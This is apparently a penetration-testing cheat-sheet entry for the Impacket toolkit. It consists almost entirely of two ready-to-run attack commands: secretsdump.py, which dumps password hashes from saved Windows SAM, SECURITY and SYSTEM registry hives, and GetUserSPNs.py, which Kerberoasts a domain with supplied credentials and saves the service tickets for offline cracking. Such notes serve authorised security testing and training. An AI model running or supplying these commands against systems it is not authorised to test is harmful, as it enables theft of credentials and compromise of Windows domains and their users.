# Impacket

% impacket, windows, smb, 445

## impacket-secretsdump - Dump password hashes from SAM
```
python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```
## impacket-GetUserSPN - Kerberoasting
```
# Kerberosting
GetUserSPNs.py <DOMAIN>/<USER>:<PASSWD> -outputfile kerberoasting.txt -dc-ip <DC IP>
```
